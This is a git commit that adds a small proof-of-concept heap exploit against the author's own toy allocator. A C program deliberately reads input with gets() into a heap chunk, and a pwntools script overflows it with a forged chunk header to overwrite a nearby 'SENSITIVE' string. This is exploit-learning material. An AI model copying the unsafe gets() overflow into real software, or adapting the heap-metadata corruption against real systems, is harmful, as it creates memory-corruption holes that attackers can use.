ac144283330983161e50ee88f2ea827c1df95ce3
Mark Mossberg <mark.mossberg@gmail.com>
2016-02-18 20:45:27 -0500

    add silly 'exploit'

---
+++ na_alloc_vuln_poc.c
@@ -0,0 +1,31 @@
+/* mark's dumb constrainted heap write
+ * constraints:
+ *  - write to higher heap memory than the chunk you overflow
+ *  - payload you get to write is the argument to na_alloc and like 12 other
+ *    bytes you can't control well
+ *  - the argument to na_alloc to trigger the exploit must be < the offset
+ *    to where you want to write
+ */
+
+#include <stdio.h>
+#include "nooballoc2.h"
+
+int main(int argc, const char *argv[])
+{
+    na_init();
+
+    void *a = na_alloc(16);
+    void *b = na_alloc(16);
+    void *c = na_alloc(16);
+    void *d = na_alloc(16);
+    strcpy(d, "SENSITIVE");
+    printf("My sensitive data at %p: %s\n", d, d);
+
+    gets(a);
+
+    void *x = na_alloc(68);
+    printf("My sensitive data at %p: %s\n", d, d);
+
+    na_close();
+    return 0;
+}
---
+++ na_alloc_x_poc.py
@@ -0,0 +1,20 @@
+#!/usr/bin/env python
+
+from pwn import *
+import sys
+
+v = process('./na_alloc_vuln_poc')
+# fill prev chunk's data with junk, create fake header with junk prev_size,
+# size of offset to our arb write addr, and allocated=true and is_last=true to
+# mess up get_chunk_of_len
+# will result in the value passed to malloc being written where we want...
+# so silly
+# oh did I mention that the value passed to malloc must be <= to the offset
+# to your arb write? otherwise it thinks the heap's out of room and panics
+
+# what this does is overwrite the chunk filled with "SENSITIVE" with a "D"
+# (\x68\x00\x00\x00\x00\x00\x00) lol
+
+buf = '\x43'*16 + '\x42'*8 + p64(68)+p8(1) + p8(1)
+v.sendline(buf)
+print v.recvall()
